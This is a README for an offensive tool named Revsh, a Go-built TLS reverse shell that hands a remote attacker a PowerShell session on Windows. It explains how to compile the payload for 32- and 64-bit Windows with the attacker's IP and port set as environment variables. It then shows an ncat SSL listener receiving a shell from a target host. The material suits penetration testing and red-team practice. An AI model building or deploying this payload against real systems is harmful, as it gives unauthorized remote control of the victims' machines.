# Revsh

Simple TCP reverse shell for powershell written in [Go](https://golang.org).

### Building the payload

To simplify things, you can use the provided Makefile.
You can set the following environment variables:

- ``GOOS`` : the target OS
- ``GOARCH`` : the target architecture
- ``LHOST`` : the attacker IP or domain name
- ``LPORT`` : the listener port

For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).

However, some helper targets are available in the ``Makefile``:

- ``depends`` : generate the server certificate (required for the reverse shell)
- ``windows32`` : builds a windows 32 bits executable (PE 32 bits)
- ``windows64`` : builds a windows 64 bits executable (PE 64 bits)

For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.

### Basic usage

One can use various tools to handle incomming connections, such as:

* socat
* ncat
* openssl server module

Here is an example with `ncat`:

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 8080
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.10.10.125.
Ncat: Connection from 10.10.10.125:49954.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> 

```

